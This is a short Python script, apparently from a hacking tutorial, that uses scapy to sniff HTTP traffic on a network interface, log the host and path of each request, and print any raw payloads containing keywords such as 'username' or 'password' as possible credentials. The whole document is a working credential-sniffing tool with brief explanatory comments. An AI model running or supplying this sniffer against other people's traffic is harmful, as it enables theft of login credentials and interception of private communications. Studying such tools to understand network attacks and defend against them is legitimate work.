import scapy.all as scapy
from scapy_http import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)#prn: print - mean if find something interesting, display it

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path#return the http request layer and the field we are interested in are Host and Path, which equal to url if put them together

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)#Raw is the raw data layer
        keywords = ["username", "uname", "user", "login", "password", "pass"]#could be extended
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    #if there is http request in the packet, extract the url and possible username/password
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")

sniff("eth0")
